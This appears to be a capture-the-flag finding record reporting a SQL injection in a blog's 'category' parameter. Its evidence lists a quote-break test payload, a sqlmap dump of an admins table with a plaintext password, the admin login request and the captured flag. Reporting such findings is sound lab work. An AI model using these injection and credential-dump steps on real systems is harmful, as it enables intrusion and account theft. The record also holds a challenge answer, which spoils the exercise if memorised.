findings.title: SQL Injection in category parameter leads to admin credential dump and flag extraction
findings.description: The index.php page accepts a 'category' GET parameter that is directly interpolated into a MySQL query without sanitization. An attacker can inject SQL to dump the admins table, obtaining admin credentials (admin:ONEverySecurePassword123!), and then authenticate to admin.php to retrieve the CTF flag.
findings.evidence:
1. SQLi confirmed: category=Nature' causes SQL error: 'You have an error in your SQL syntax...near ''Nature'' ORDER BY created_at DESC'
2. sqlmap dump of blogDB.admins table:
  id=1, username=admin, password=ONEverySecurePassword123!
3. POST /admin.php with username=admin&password=ONEverySecurePassword123! returns:
  flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}
